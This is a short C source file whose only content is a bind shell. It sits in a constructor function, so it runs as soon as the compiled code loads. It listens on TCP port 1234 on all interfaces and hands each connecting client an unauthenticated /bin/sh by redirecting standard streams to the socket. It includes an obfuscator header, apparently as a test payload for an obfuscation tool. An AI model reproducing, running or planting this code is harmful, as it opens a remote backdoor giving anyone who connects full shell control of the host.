#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h> 
#include <sys/wait.h>

#include "../src/obfuscator.h"

void __attribute__((constructor)) bind_shell(){
  int host_sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in host_addr;
  host_addr.sin_family = AF_INET;
  host_addr.sin_port = htons(1234);
  host_addr.sin_addr.s_addr = INADDR_ANY;
  bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
  listen(host_sock, 0);
  
  while(1){
    int client_sock = accept(host_sock, NULL, NULL);
    if(client_sock > 0){
      pid_t pid;
      if((pid = fork()) == 0){
	dup2(client_sock, 0);
	dup2(client_sock, 1);
	dup2(client_sock, 2);
	execve("/bin/sh", NULL, NULL);
      }else{
	wait(NULL);
	close(client_sock);
      }
    }
  }
}

